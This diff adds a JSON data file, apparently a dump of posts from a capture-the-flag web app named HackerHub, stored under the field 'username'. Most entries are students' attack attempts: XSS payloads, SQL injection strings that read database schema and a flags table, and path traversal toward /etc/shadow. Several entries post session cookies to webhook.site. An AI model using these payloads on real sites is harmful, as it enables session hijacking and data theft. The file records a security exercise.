@@ -1,0 +1,1010 @@
+[
+    {
+        "id": "2",
+        "username": "Just discovered a new XSS vulnerability in a popular framework. Details coming soon!",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "3",
+        "username": "Anyone working on the latest CTF challenge? The crypto section is tough this year.",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "4",
+        "username": "Attended DEFCON last week. Amazing talks on hardware hacking!",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "5",
+        "username": "Published my research on memory corruption exploits. Check it out!",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "1",
+        "username": "Welcome to HackerHub! Share your security research and findings here.",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "11",
+        "username": "Howdy!",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "15",
+        "username": "JFDKLS",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "12",
+        "username": "hi",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "15",
+        "username": "<script>alert(\"A\")</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "15",
+        "username": "<script>alert(\"FASKLFJASKLFKASJ\");</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "16",
+        "username": "HI",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "Select * from tables;",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "SELECT @@version",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "SELECT @@version;",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "Select version();",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "'",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "' OR '1'='1",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "' -- -",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "' --",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "24",
+        "username": "hello\n",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "24",
+        "username": "bufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbufferbuffer",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "' UNION SELECT version()-- -",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "\" UNION SELECT version()-- -",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "25",
+        "username": "hi",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "' AND 1=0 UNION SELECT 'AAA',GROUP_CONCAT(routine_name),'CCC','DDD' FROM information_schema.routines WHERE routine_schema='hackerhub'-- -",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "25",
+        "username": "h",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "27",
+        "username": "<script>alert(1)</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "27",
+        "username": "&apos;; alert(haha);//\n",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "27",
+        "username": "<img src=x onerror=alert(1)>\n",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "27",
+        "username": "ddsdadsad",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "30",
+        "username": "../",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "33",
+        "username": "...",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "12",
+        "username": "'",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "12",
+        "username": "<b>Hello World</b>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "12",
+        "username": "Check this out!<img src=x onerror=\"alert('Stored XSS from the Feed!')\">",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "39",
+        "username": "GET /download?file=../../../../etc/shado",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "39",
+        "username": "GET /download?file=../../../../etc/shadow",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "21",
+        "username": "<button onclick=\"alert('Error');\">Click Me</button>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "21",
+        "username": "<a href=\"https://www.google.com\">XSS Link</a>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "40",
+        "username": "Trying to find the flag",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "41",
+        "username": "hello\n",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "41",
+        "username": "hello",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "41",
+        "username": "<img src=x onerror=alert('XSS')>\n",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "41",
+        "username": "test' AND '1'='1",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "36",
+        "username": "www",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "41",
+        "username": "h",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "41",
+        "username": "zzzztest12345",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "44",
+        "username": "bhbhbbhbh",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "45",
+        "username": "hi",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "42",
+        "username": "hello",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "42",
+        "username": "asdf",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "48",
+        "username": "hello world",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "48",
+        "username": "<b> Hello there. </b>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "48",
+        "username": "a",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "18",
+        "username": "test",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "27",
+        "username": "\\<img src=x onerror=\"new Image().src='https://webhook.site/a023a556-238e-4d53-\n988b-6cbaed97861e?cookie='+document.cookie;\">",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "27",
+        "username": "\\<img src=x onerror=\"new Image().src='https://webhook.site/a023a556-238e-4d53-988b-6cbaed97861e?cookie='+document.cookie;\">",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "33",
+        "username": "<img src=\"storedXSStoMinesweeper\" onerror=\"window.location='https://share.google/poOl0EnKd85bCfkim'\">",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "26",
+        "username": "<script>alert(\"Sesha was here\");</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "26",
+        "username": "Hello",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "26",
+        "username": "<script>alert(\"XSS!\");</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "26",
+        "username": "<script>console.log(\"Am I being executed?\");</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "55",
+        "username": "Hello World",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "26",
+        "username": "<script>document.addEventListener(\"DOMContentLoaded\", () => {alert(\"Hello diddy blud!\");})</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "55",
+        "username": "<img src=x onerror=alert('Stored XSS')>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "26",
+        "username": "window.addEventListener(\"load\", () => {\n  console.log(\"Hello diddy blud\");\n});",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "55",
+        "username": "<img src=x onerror=alert(1)>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "55",
+        "username": "<img src=x onerror=alert(\"Stored XSSS\")>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "55",
+        "username": "<img src=x onerror=alert('Reflected XSS')>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "55",
+        "username": "<img src=x onerror=alert(String.fromCharCode(83,116,111,114,101,100,32,88,83,83))>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "59",
+        "username": "GET /download?file=../../../../etc/shadow",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "59",
+        "username": "GET /download?file=../../",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "26",
+        "username": "<svg onload=\"function()\">\n<script>alert(1)</script>\n</svg>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "26",
+        "username": "<svg onload=\"myLoadFunction()\">\n  <script>\n    function myLoadFunction() {\n      // Code to run when the SVG loads\n      console.log(\"SVG loaded!\");\n    }\n  </script>\n  <!-- Other SVG elements -->\n</svg>\n",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "26",
+        "username": "<p><script>alert(2)</script></p>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "26",
+        "username": "<p>Stupid ass XSS bro</p>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "26",
+        "username": "<h1>Stupid ass XSS man</h1>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "26",
+        "username": "<img src=1 onerror=alert(1)/>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "26",
+        "username": "<p><script>document.body.style.backgroundColor = \"#ff5733\";</script></p>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "26",
+        "username": "<p><script>document.getElementById(\"section-comments\").style.backgroundColor = \"yellow\";</script></p>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "26",
+        "username": "<img src=1 onerror=alert(1)>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "26",
+        "username": "<img src=1 onerror=document.body.style.backgroundColor = \"lightblue\">",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "26",
+        "username": "<img src=\"broken-image.jpg\" \n     onerror=\"document.body.style.backgroundColor = 'lightcoral'\">",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "59",
+        "username": "`",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<script>alert(\"help \");</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<button onclick=\"document.getElementById('demo').innerHTML = Date()\">The time is?</button>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "59",
+        "username": "0' UNION SELECT * FROM secrets",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "21",
+        "username": "<img src=x onerror=alert('Reflected XSS')>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "21",
+        "username": "<img src=nowhere onerror=alert('Reflected XSS from David')>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "21",
+        "username": "Howdy, this is a test comment",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "21",
+        "username": "<img src=howdy onerror=alert('Reflected!')/>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "21",
+        "username": "<img src=0 onerror=alert(1)/>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "21",
+        "username": "<img src=0 onerror=alert(1)>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "21",
+        "username": "<img src=nowhere onerror=alert('This is a stored XSS')>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "62",
+        "username": "<img src=0 onerror=alert('This is a stored XSS')>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "62",
+        "username": "<img src=nowhere onerror=alert('ThisIsStoredXSS')>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "21",
+        "username": "<img src=nowhere onerror=alert('ThisIsStoredXSS')>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "19",
+        "username": "howdy alice :) david was here",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "19",
+        "username": "howdy alice :) david was here again!",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "21",
+        "username": "howdy",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "19",
+        "username": "Jesus loves you :))",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "12",
+        "username": "1=1",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "36",
+        "username": "aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "36",
+        "username": "<script>alert('XSS!')</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<script>\nlocation.href =\n\u2019https://webhook.site/cf0adbf8-8ff1-4d5a-8bbc-284e594abc5d/?cookie=\u2019document.cookie;\n</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<script>\nlocation.href =\n\u2019https://webhook.site/cf0adbf8-8ff1-4d5a-8bbc-284e594abc5d/?cookie=\u2019document.PHPSESSID;\n</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<script>\nlocation.href =\n\u2019https://webhook.site/cf0adbf8-8ff1-4d5a-8bbc-284e594abc5d/?cookie=\u2019document.cookie.split('PHPSESSID=')[1];\n</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<script>\nlocation.href =\n'https://webhook.site/cf0adbf8-8ff1-4d5a-8bbc-284e594abc5d/?flag='document.cookie.split('PHPSESSID=')[1];\n</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<script>\nlocation.href =\n'https://webhook.site/cf0adbf8-8ff1-4d5a-8bbc-284e594abc5d/?flag=' + document.cookie.split('PHPSESSID=')[1];\n</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<script>alert(\"bruh\")</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "<script>alert('XSS!')</script",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "aaaa",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "<script>alert(\"XSS!\")<\\script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "<script>alert(\"XSS!\");<\\script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<element event=element.appendChild(new Image()).src = 'https://webhook.site/cf0adbf8-8ff1-4d5a-8bbc-284e594abc5d/?flag=' + document.cookie.split('PHPSESSID=')[1];>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "<script> alert(\"XSS!\");</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<element event=alert(\"your cookie is \" + document.cookie.split('PHPSESSID=')[1])>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "l",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<element event=alert(\"your cookie is \" + document.cookie.split('PHPSESSID=')[1]);>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<img src='https://webhook.site/cf0adbf8-8ff1-4d5a-8bbc-284e594abc5d/?flag=' + document.cookie.split('PHPSESSID=')[1]>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<img src=\"\" onload=\"var img = newImage();img.src='https://webhook.site/cf0adbf8-8ff1-4d5a-8bbc-284e594abc5d/?cookie=' + document.cookie.split('PHPSESSID=')[1];\">",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "<div onmouseover=alert(1)>hover me</div>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<img src=\"\" onload=fetch('https://webhook.site/cf0adbf8-8ff1-4d5a-8bbc-284e594abc5d/?cookie=' +  document.cookie.split('PHPSESSID=')[1], { method: 'GET'})\">",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "<div onmousepointer=alert(\"flag\")>Hover over me to demonstrate stored XSS<\\div>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<img src=\"a\" onload=fetch('https://webhook.site/cf0adbf8-8ff1-4d5a-8bbc-284e594abc5d/', { method: 'POST', mode: 'no-cors', body:document.cookie })\">",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "22",
+        "username": "<div onmouseover=alert(\"Flag!\")>Hover over me to demonstrate stored XSS</div>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<img src=\"a\" onload=\"location.href='https://webhook.site/cf0adbf8-8ff1-4d5a-8bbc-284e594abc5d/?flag=' + document.cookie.split('PHPSESSID=')[1]\">",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<img src=\"a\" onload=\"alert(\"a\")\">",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "58",
+        "username": "<img src=\"a\" onerror=\"location.href='https://webhook.site/cf0adbf8-8ff1-4d5a-8bbc-284e594abc5d/?flag=' + document.cookie.split('PHPSESSID=')[1]\">\n",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "63",
+        "username": "<script>alert(\"XSS\")</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "57",
+        "username": "sueen",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "60",
+        "username": "<script>alert(\"HI\")</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "63",
+        "username": "<img src=x onerror=alert(1)>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "53",
+        "username": "hi",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "53",
+        "username": "Hello\n",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "53",
+        "username": "Hello\\n",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "25",
+        "username": "x",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "47",
+        "username": "first comment",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "64",
+        "username": "a",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "41",
+        "username": "' OR '1'='1",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "41",
+        "username": "\" OR \"1\"=\"1",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "41",
+        "username": "' AND SUBSTRING((SELECT flag FROM flags),1,1)='F'--",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "41",
+        "username": "<img src=x onerror=alert('reflected xss')>\n",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "41",
+        "username": "<img src=x onerror=alert('stored xss')>\n",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "41",
+        "username": "#<img src=x onerror=alert('dom xss')>\n",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "66",
+        "username": "Howdy!",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "18",
+        "username": "<body onload=alert('XSS')>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "18",
+        "username": "<img src=x onerror=alert('XSS')>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "59",
+        "username": "<a href=\"javascript:alert(1)\">DOM-Based XSS</a>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "59",
+        "username": "<a href=\"javascript:alert(1)\">Stored XSS</a>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "49",
+        "username": "a",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "31",
+        "username": "<script> alert('XSS')! <script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "31",
+        "username": "<script> alert('XSS') </script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "31",
+        "username": "<script> alert('XSS'); </script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "14",
+        "username": "test",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "14",
+        "username": "testb",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "31",
+        "username": "<h2> Hello </h2>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "31",
+        "username": "Hello",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "31",
+        "username": "<script> alert('Hello') <script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "31",
+        "username": "onload=alert('XSS')",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "49",
+        "username": "<alert>aass</alert>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "31",
+        "username": "<span onload=alert('XSS')>!</span>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "14",
+        "username": "<input id=\"search-input\">",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "14",
+        "username": "<script>alert(\"hello\");</script>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "31",
+        "username": "<span onfocus=alert(1) autofocus>!</span> ",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "31",
+        "username": "<img src=nothing onerror=alert('1')>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "31",
+        "username": "<img src=nothing onerror=while(true)alert('XSS')>",
+        "email": null,
+        "bio": null
+    },
+    {
+        "id": "59",
+        "username": "SELECT * FROM secrets",
+        "email": null,
+        "bio": null
+    }
+]
